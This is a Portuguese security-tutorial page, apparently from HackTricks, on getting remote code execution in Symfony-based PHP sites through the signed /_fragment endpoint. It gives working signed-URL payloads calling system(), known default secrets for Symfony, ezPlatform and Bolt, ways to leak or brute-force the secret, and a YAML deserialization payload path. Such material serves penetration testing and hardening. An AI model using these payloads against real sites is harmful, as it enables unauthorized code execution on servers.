## Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Introdu√ß√£o <a href="#introduction" id="introduction"></a>

Desde sua cria√ß√£o em 2008, o uso do framework [Symfony](https://symfony.com) tem crescido cada vez mais em aplica√ß√µes baseadas em PHP. Agora √© um componente central de muitos CMSs conhecidos, como [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anteriormente eZPublish) ou [Bolt](https://bolt.cm), e √© frequentemente usado para construir sites personalizados.

Uma das funcionalidades integradas do Symfony, feita para lidar com [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), √© a classe [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Basicamente, quando algu√©m emite uma solicita√ß√£o para `/_fragment`, esse ouvinte define atributos de solicita√ß√£o a partir dos par√¢metros GET fornecidos. Como isso permite **executar c√≥digo PHP arbitr√°rio** (_mais sobre isso depois_), a solicita√ß√£o deve ser assinada usando um valor HMAC. A chave criptogr√°fica secreta desse HMAC √© armazenada em um valor de configura√ß√£o do Symfony chamado `secret`.

Esse valor de configura√ß√£o, `secret`, tamb√©m √© usado, por exemplo, para construir tokens CSRF e tokens de lembran√ßa. Dado sua import√¢ncia, esse valor deve ser obviamente muito aleat√≥rio.

Infelizmente, descobrimos que muitas vezes, o segredo tem um valor **padr√£o**, ou existem **maneiras de obter o valor, for√ß√°-lo offline ou simplesmente ignorar a verifica√ß√£o de seguran√ßa com a qual est√° envolvido**. Isso afeta principalmente o Bolt, o eZPlatform e o eZPublish.

Embora isso possa parecer um problema de configura√ß√£o benigno, descobrimos que valores padr√£o, for√ß√°veis ou adivinh√°veis est√£o **muito, muito frequentemente presentes** nos CMSs mencionados, bem como em aplicativos personalizados. Isso se deve principalmente √† falta de √™nfase em sua import√¢ncia na documenta√ß√£o ou nos guias de instala√ß√£o.

Al√©m disso, um invasor pode escalar vulnerabilidades menos impactantes para ler o `secret` (por meio de uma divulga√ß√£o de arquivo), ignorar o processo de assinatura `/_fragment` (usando um SSRF) e at√© mesmo vaz√°-lo por meio de `phpinfo()`!

Neste post, descreveremos como o segredo pode ser obtido em v√°rios CMSs e no framework base, e como obter a execu√ß√£o de c√≥digo usando esse segredo.

## Um pouco de hist√≥ria <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

Sendo um framework moderno, o Symfony teve que lidar com a gera√ß√£o de subpartes de uma solicita√ß√£o desde sua cria√ß√£o at√© nossos dias. Antes de `/_fragment`, havia `/_internal` e `/_proxy`, que faziam essencialmente a mesma coisa. Isso produziu muitas vulnerabilidades ao longo dos anos: [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy) e [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), por exemplo.

Desde o Symfony 4, o segredo √© gerado na instala√ß√£o e a p√°gina `/_fragment` √© desativada por padr√£o. Poder√≠amos pensar, portanto, que a conjun√ß√£o de ambos ter um `secret` fraco e `/_fragment` habilitado seria rara. N√£o √©: muitos frameworks dependem de vers√µes antigas do Symfony (mesmo o 2.x ainda √© muito presente), e implementam um valor `secret` est√°tico ou o geram de forma inadequada. Al√©m disso, muitos dependem do ESI e, como tal, habilitam a p√°gina `/_fragment`. Al√©m disso, como veremos, outras vulnerabilidades de baixo impacto podem permitir o despejo do segredo, mesmo que tenha sido gerado com seguran√ßa.

## Executando c√≥digo com a ajuda de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Demonstraremos primeiro como um invasor, tendo conhecimento do valor de configura√ß√£o `secret`, pode obter a execu√ß√£o de c√≥digo. Isso √© feito para a √∫ltima vers√£o do `symfony/http-kernel`, mas √© semelhante para outras vers√µes.

### Usando `/_fragment` para executar c√≥digo arbitr√°rio <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Como mencionado anteriormente, faremos uso da p√°gina `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    public function onKernelRequest(RequestEvent $event)
    {
        $request = $event->getRequest();

        # [1]
        if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
            return;
        }

        if ($request->attributes->has('_controller')) {
            // Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
            $request->query->remove('_path');

            return;
        }

        # [2]
        if ($event->isMasterRequest()) {
            $this->validateRequest($request);
        }

        # [3]
        parse_str($request->query->get('_path', ''), $attributes);
        $request->attributes->add($attributes);
        $request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
        $request->query->remove('_path');
    }
}
```
`FragmentListener:onKernelRequest` ser√° executado em cada solicita√ß√£o: se o caminho da solicita√ß√£o for `/_fragment` \[1\], o m√©todo primeiro verificar√° se a solicita√ß√£o √© v√°lida (_ou seja_, devidamente assinada) e lan√ßar√° uma exce√ß√£o caso contr√°rio \[2\]. Se as verifica√ß√µes de seguran√ßa forem bem-sucedidas, ele analisar√° o par√¢metro `_path` codificado na URL e definir√° os atributos `$request` de acordo.

Os atributos da solicita√ß√£o n√£o devem ser confundidos com os par√¢metros da solicita√ß√£o HTTP: eles s√£o valores internos, mantidos pelo Symfony, que geralmente n√£o podem ser especificados por um usu√°rio. Um desses atributos de solicita√ß√£o √© `_controller`, que especifica qual controlador do Symfony (uma tupla _(classe, m√©todo)_ ou simplesmente uma _fun√ß√£o_) deve ser chamado. Atributos cujo nome n√£o come√ßa com `_` s√£o argumentos que ser√£o fornecidos ao controlador. Por exemplo, se quis√©ssemos chamar este m√©todo:
```php
class SomeClass
{
    public function someMethod($firstMethodParam, $secondMethodParam)
    {
        ...
    } 
}
```
N√≥s definimos `_path` como:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

A solicita√ß√£o ficaria assim:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

Essencialmente, isso permite chamar qualquer fun√ß√£o ou m√©todo de qualquer classe, com qualquer par√¢metro. Dada a infinidade de classes que o Symfony possui, **obter a execu√ß√£o de c√≥digo √© trivial**. Podemos, por exemplo, chamar `system()`:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Chamar o sistema nem sempre funcionar√°: consulte a se√ß√£o de explora√ß√£o para obter mais detalhes sobre as sutilezas da explora√ß√£o._

Um problema permanece: como o Symfony verifica a assinatura da solicita√ß√£o?

### Assinando a URL <a href="#signing-the-url" id="signing-the-url"></a>

Para verificar a assinatura de uma URL, um HMAC √© calculado em rela√ß√£o √† URL _completa_. O hash obtido √© ent√£o comparado com o especificado pelo usu√°rio.

Em termos de c√≥digo, isso √© feito em dois pontos:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // is the Request signed?
        if ($this->signer->checkRequest($request)) {
            return;
        }

        # [3]
        throw new AccessDeniedHttpException();
    }
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
    public function checkRequest(Request $request): bool
    {
        $qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
    }

    /**
     * Checks that a URI contains the correct hash.
     *
     * @return bool True if the URI is signed correctly, false otherwise
     */
    public function check(string $uri)
    {
        $url = parse_url($uri);
        if (isset($url['query'])) {
            parse_str($url['query'], $params);
        } else {
            $params = [];
        }

        if (empty($params[$this->parameter])) {
            return false;
        }

        $hash = $params[$this->parameter];
        unset($params[$this->parameter]);

        # [2]
        return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
    }

    private function computeHash(string $uri): string
    {
        # [1]
        return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
    }

    private function buildUrl(array $url, array $params = []): string
    {
        ksort($params, SORT_STRING);
        $url['query'] = http_build_query($params, '', '&');

        $scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
        $host = isset($url['host']) ? $url['host'] : '';
        $port = isset($url['port']) ? ':'.$url['port'] : '';
        $user = isset($url['user']) ? $url['user'] : '';
        $pass = isset($url['pass']) ? ':'.$url['pass'] : '';
        $pass = ($user || $pass) ? "$pass@" : '';
        $path = isset($url['path']) ? $url['path'] : '';
        $query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
        $fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

        return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
    }
}
```
Em resumo, o Symfony extrai o par√¢metro GET `_hash`, em seguida, reconstr√≥i a URL completa, por exemplo, `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcula um HMAC a partir desta URL usando o `secret` como chave \[1], e compara com o valor de hash fornecido \[2]. Se eles n√£o coincidirem, uma exce√ß√£o `AccessDeniedHttpException` √© gerada \[3], resultando em um erro `403`.

### Exemplo <a href="#example" id="example"></a>

Para testar isso, vamos configurar um ambiente de teste e extrair o segredo (neste caso, gerado aleatoriamente).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Agora, visitando `http://localhost:8000/_fragment` retorna um `403`. Vamos tentar fornecer uma assinatura v√°lida:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
Ao verificar `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, agora temos um c√≥digo de status `404`. A assinatura estava correta, mas n√£o especificamos nenhum atributo de solicita√ß√£o, ent√£o o Symfony n√£o encontra nosso controlador.

Como podemos chamar qualquer m√©todo, com qualquer argumento, podemos, por exemplo, escolher `system($command, $return_value)`, e fornecer um payload assim:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Agora podemos visitar a URL de explora√ß√£o: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

Apesar do erro `500`, podemos ver que **nosso comando foi executado**.

_RCE usando fragmento_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Encontrando segredos <a href="#finding-secrets" id="finding-secrets"></a>

Novamente: tudo isso n√£o importaria se os segredos n√£o fossem obtidos. Muitas vezes, eles s√£o. Descreveremos v√°rias maneiras de obter a execu√ß√£o de c√≥digo sem nenhum conhecimento pr√©vio.

### Atrav√©s de vulnerabilidades <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Vamos come√ßar com o √≥bvio: usando vulnerabilidades de baixo impacto para obter o segredo.

#### Leitura de arquivo <a href="#file-read" id="file-read"></a>

Evidentemente, uma vulnerabilidade de leitura de arquivo poderia ser usada para ler os seguintes arquivos e obter o `segredo`:

* `app/config/parameters.yml`
* `.env`

_Como exemplo, algumas barras de ferramentas de depura√ß√£o do Symfony permitem a leitura de arquivos._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

Nas vers√µes recentes do Symfony (3.x), o `segredo` √© armazenado em `.env` como `APP_SECRET`. Uma vez que √© ent√£o importado como uma vari√°vel de ambiente, eles podem ser vistos atrav√©s de uma p√°gina `phpinfo()`.

_Vazando APP\_SECRET atrav√©s do phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Isso pode ser feito principalmente atrav√©s do pacote de perfil do Symfony, como demonstrado pela captura de tela.

#### SSRF / IP spoofing (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

O c√≥digo por tr√°s do `FragmentListener` evoluiu ao longo dos anos: at√© a vers√£o _2.5.3_, quando a solicita√ß√£o vinha de um proxy confi√°vel (leia-se: `localhost`), ela seria considerada segura e, como tal, o hash n√£o seria verificado. Um SSRF, por exemplo, pode permitir a execu√ß√£o imediata de c√≥digo, independentemente de ter ou n√£o o `segredo`. Isso afeta principalmente o eZPublish at√© 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // does the Request come from a trusted IP?
        $trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
        $remoteAddress = $request->server->get('REMOTE_ADDR');
        if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
            return;
        }

        // is the Request signed?
        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
            return;
        }

        throw new AccessDeniedHttpException();
    }

    protected function getLocalIpAddresses()
    {
        return array('127.0.0.1', 'fe80::1', '::1');
    }
```
Admitidamente, todas essas t√©cnicas requerem outra vulnerabilidade. Vamos mergulhar em um vetor ainda melhor: valores padr√£o.

### Atrav√©s de valores padr√£o <a href="#atrav√©s-de-valores-padr√£o" id="atrav√©s-de-valores-padr√£o"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Ao configurar um site Symfony, o primeiro passo √© instalar o esqueleto [symfony-standard](https://github.com/symfony/symfony-standard). Quando instalado, uma solicita√ß√£o pede alguns valores de configura√ß√£o. Por padr√£o, a chave √© `ThisTokenIsNotSoSecretChangeIt`.

_Instala√ß√£o do Symfony atrav√©s do composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

Em vers√µes posteriores (4+), a chave secreta √© gerada com seguran√ßa.

#### ezPlatform 3.x (mais recente): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), o sucessor do [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), ainda usa o Symfony. Em 10 de junho de 2019, um [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) definiu a chave padr√£o como `ff6dc61a329dc96652bb092ec58981f7`. As vers√µes vulner√°veis variam de 3.0-alpha1 a 3.1.1 (atual).

Embora a [documenta√ß√£o](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) afirme que a chave secreta deve ser alterada, isso n√£o √© obrigat√≥rio.

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Assim como o esqueleto do Symfony, voc√™ ser√° solicitado a inserir uma chave secreta durante a instala√ß√£o. O valor padr√£o √© `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (mais recente): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

O [Bolt CMS](https://bolt.cm) usa o [Silex](https://github.com/silexphp/Silex), um micro-framework obsoleto baseado no Symfony. Ele configura a chave secreta usando este c√°lculo:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Assim, √© poss√≠vel adivinhar o segredo ou usar uma vulnerabilidade de Divulga√ß√£o de Caminho Completo para calcul√°-lo.

Se voc√™ n√£o teve sucesso com as chaves secretas padr√£o, n√£o desanime: existem outras maneiras.

### For√ßa bruta <a href="#bruteforce" id="bruteforce"></a>

Como o segredo geralmente √© definido manualmente (em vez de gerado aleatoriamente), as pessoas costumam usar uma frase secreta em vez de um valor aleat√≥rio seguro, o que o torna suscet√≠vel a ataques de for√ßa bruta se tivermos um hash para atacar. Obviamente, uma URL v√°lida `/_fragment`, como a gerada pelo Symfony, nos forneceria uma tupla de mensagem-hash v√°lida para atacar o segredo.

_Uma solicita√ß√£o v√°lida ao fragmento est√° inclu√≠da na resposta_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

No in√≠cio deste post, dissemos que o segredo do Symfony tinha v√°rios usos. Um desses usos √© que ele tamb√©m √© usado para gerar tokens CSRF. Outro uso de `secret` √© assinar cookies de lembran√ßa. Em alguns casos, um invasor pode usar seu pr√≥prio token CSRF ou cookie de lembran√ßa para atacar o valor de `secret`.

_A engenharia reversa da constru√ß√£o desses tokens √© deixada como um exerc√≠cio para o leitor._

### Indo mais longe: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

Como exemplo de como segredos podem ser atacados por for√ßa bruta para obter execu√ß√£o de c√≥digo, veremos como podemos descobrir o segredo do eZPublish 2014.07.

#### Encontrando material para for√ßa bruta <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

O eZPublish gera seus tokens CSRF assim:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Para construir este token, o eZP usa dois valores que conhecemos e o segredo: `getIntention()` √© a a√ß√£o que o usu√°rio est√° tentando realizar (`autenticar`, por exemplo), `session_id()` √© o ID da sess√£o PHP e `getSecret()`, bem, √© o `segredo` do Symfony.

Como os tokens CSRF podem ser encontrados em alguns formul√°rios, agora temos o material para for√ßar o segredo.

Infelizmente, o ezPublish incorporou um pacote da sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Este pacote garante que a chave secreta seja aleat√≥ria. Ele a gera assim, durante a instala√ß√£o:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
    return hash('sha1', uniqid(mt_rand()));
}
```
Isso parece ser muito dif√≠cil de for√ßar: `mt_rand()` pode gerar 231 valores diferentes, e `uniqid()` √© constru√≠do a partir do timestamp atual (com microssegundos).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Divulga√ß√£o do timestamp <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Felizmente, sabemos que esse segredo √© gerado na √∫ltima etapa da instala√ß√£o, logo ap√≥s a configura√ß√£o do site. Isso significa que provavelmente podemos vazar o timestamp usado para gerar esse hash.

Uma maneira de fazer isso √© usando os logs (_por exemplo_, `/var/log/storage.log`); pode-se vazar a primeira vez que uma entrada de cache foi criada. A entrada de cache √© criada logo ap√≥s a chamada de `generateRandomSecret()`.

_Conte√∫do de log de amostra: o timestamp √© semelhante ao usado para calcular o segredo_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Se os logs n√£o estiverem dispon√≠veis, pode-se usar o poderoso mecanismo de pesquisa do eZPublish para encontrar o hor√°rio de cria√ß√£o do primeiro elemento do site. De fato, quando o site √© criado, muitos timestamps s√£o colocados no banco de dados. Isso significa que o timestamp dos dados iniciais do site eZPublish √© o mesmo usado para calcular `uniqid()`. Podemos procurar o _ContentObject_ `landing_page` e descobrir seu timestamp.

## Bruteforcing dos bits ausentes <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Agora estamos cientes do timestamp usado para calcular o segredo, bem como de um hash da seguinte forma:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Isso nos deixa com um total de 231 \* 106 possibilidades. Parece fact√≠vel com o [hashcat](https://hashcat.net) e um bom conjunto de GPUs, mas o hashcat n√£o fornece um kernel `sha1(sha1($pass).$salt)`. Felizmente, n√≥s o implementamos! Voc√™ pode encontrar [a solicita√ß√£o de pull aqui](https://github.com/hashcat/hashcat/pull/2536).

Usando nossa m√°quina de cracking, que possui 8 GPUs, podemos quebrar esse hash em _menos de 20 horas_.

Depois de obter o hash, podemos usar `/_fragment` para executar c√≥digo.

## Conclus√£o <a href="#conclus√£o" id="conclus√£o"></a>

Symfony √© agora um componente central de muitas aplica√ß√µes PHP. Como tal, qualquer risco de seguran√ßa que afete o framework afeta muitos sites. Como demonstrado neste artigo, uma chave secreta fraca ou uma vulnerabilidade menos impactante permite que os atacantes obtenham **execu√ß√£o remota de c√≥digo**.

Como um blue teamer, voc√™ deve dar uma olhada em todos os seus sites dependentes do Symfony. O software atualizado n√£o pode ser descartado para vulnerabilidades, pois a chave secreta √© gerada na primeira instala√ß√£o do produto. Portanto, se voc√™ criou um site baseado no Symfony 3.x h√° alguns anos e o manteve atualizado ao longo do caminho, as chances s√£o de que a chave secreta ainda seja a padr√£o.

## Explora√ß√£o <a href="#explora√ß√£o" id="explora√ß√£o"></a>

### Teoria <a href="#teoria" id="teoria"></a>

Por um lado, temos algumas coisas com que nos preocupar ao explorar essa vulnerabilidade:

* O HMAC √© calculado usando a **URL completa**. Se o site estiver atr√°s de um proxy reverso, precisamos usar a URL interna do servi√ßo em vez daquela para a qual estamos enviando nossa carga √∫til. Por exemplo, a URL interna pode ser HTTP em vez de HTTPS.
* O algoritmo HMAC mudou ao longo dos anos: era **SHA-1** antes e agora √© **SHA-256**.
* Como o Symfony remove o par√¢metro `_hash` da solicita√ß√£o e, em seguida, gera a URL novamente, precisamos calcular o hash na mesma URL que ele.
* Muitos segredos podem ser usados, ent√£o precisamos verific√°-los todos.
* Em algumas vers√µes do PHP, n√£o podemos chamar fun√ß√µes que t√™m par√¢metros "por refer√™ncia", como `system($command, &$return_value)`.
* Em algumas vers√µes do Symfony, `_controller` n√£o pode ser uma fun√ß√£o, tem que ser um m√©todo. Precisamos encontrar um m√©todo Symfony que nos permita executar c√≥digo.

Por outro lado, podemos aproveitar algumas coisas:

* Acessar `/_fragment` sem par√¢metros ou com um hash inv√°lido deve retornar um `403`.
* Acessar `/_fragment` com um hash v√°lido, mas sem um controlador v√°lido, deve resultar em um `500`.

O √∫ltimo ponto nos permite testar valores secretos sem nos preocuparmos com qual fun√ß√£o ou m√©todo vamos chamar depois.

### Pr√°tica <a href="#pr√°tica" id="pr√°tica"></a>

Digamos que estamos atacando `https://target.com/_fragment`. Para ser capaz de assinar corretamente uma URL, precisamos ter conhecimento de:

* URL interna: pode ser `https://target.com/_fragment`, ou talvez `http://target.com/_fragment`, ou algo completamente diferente (_por exemplo_, `http://target.website.internal`), que n√£o podemos adivinhar
* Chave secreta: temos uma lista de chaves secretas usuais, como `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algoritmo: SHA1 ou SHA256

N√£o precisamos nos preocupar com a carga √∫til efetiva (o conte√∫do de `_path`) ainda, porque uma URL assinada corretamente n√£o resultar√° em uma `AccessDeniedHttpException` sendo lan√ßada e, como tal, n√£o resultar√° em um `403`. O exploit, portanto, tentar√° cada combina√ß√£o `(algoritmo, URL, segredo)`, gerar√° uma URL e verificar√° se ela n√£o resulta em um c√≥digo de status `403`.

_Uma solicita√ß√£o v√°lida para `/_fragment`, sem o par√¢metro `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

Neste ponto, podemos assinar qualquer URL `/_fragment`, o que significa que √© uma garantia de RCE. √â apenas uma quest√£o do que chamar.

Ent√£o, precisamos descobrir se podemos chamar uma fun√ß√£o diretamente ou se precisamos usar um m√©todo de classe. Podemos primeiro tentar a maneira mais direta, usando uma fun√ß√£o como `phpinfo ([ int $what = INFO_ALL ] )` ([documenta√ß√£o](https://www.php.net/manual/en/function.phpinfo.php)). O par√¢metro GET `_path` ficaria assim:
```
_controller=phpinfo
&what=-1
```
E a URL ficaria assim:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Se a resposta HTTP exibir uma p√°gina `phpinfo()`, n√≥s conseguimos. Ent√£o podemos tentar usar outra fun√ß√£o, como `assert`:

_Exemplo de sa√≠da usando `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

Caso contr√°rio, isso significa que precisaremos usar um m√©todo de classe. Um bom candidato para isso √© `Symfony\Component\Yaml\Inline::parse`, que √© uma classe Symfony integrada e, portanto, est√° presente em sites Symfony.

Obviamente, esse m√©todo analisa uma string de entrada YAML. O analisador YAML do Symfony suporta a tag `php/object`, que converter√° uma string de entrada serializada em um objeto usando `unserialize()`. Isso nos permite usar nossa ferramenta PHP favorita, [PHPGGC](https://github.com/ambionics/phpggc)!

O prot√≥tipo do m√©todo mudou ao longo dos anos. Por exemplo, aqui est√£o tr√™s prot√≥tipos diferentes:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
Em vez de construir `_path` para cada um desses, podemos aproveitar o fato de que se fornecermos um argumento cujo nome n√£o corresponda ao prot√≥tipo do m√©todo, ele ser√° ignorado. Portanto, podemos adicionar todos os argumentos poss√≠veis ao m√©todo, sem nos preocuparmos com o prot√≥tipo real.

Portanto, podemos construir `_path` assim:
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
Novamente, podemos tentar com `phpinfo()` e ver se funciona. Se funcionar, podemos usar `system()` em vez disso.

_Exemplo de sa√≠da usando `Inline::parse` com uma carga serializada_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

O exploit, portanto, executar√° todas as poss√≠veis combina√ß√µes de vari√°veis e, em seguida, tentar√° os dois m√©todos de explora√ß√£o. O c√≥digo est√° dispon√≠vel em [nosso GitHub](https://github.com/ambionics/symfony-exploits).

## Acessando informa√ß√µes do symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Como voc√™ pode ver na captura de tela acima, h√° um logotipo `sf` no canto inferior direito da p√°gina. Este logotipo √© exibido quando o Symfony est√° no modo de depura√ß√£o. H√° alguns casos em que este logotipo n√£o aparece, ent√£o tente acessar `/_profiler` e voc√™ ver√° a p√°gina como mostrado abaixo.

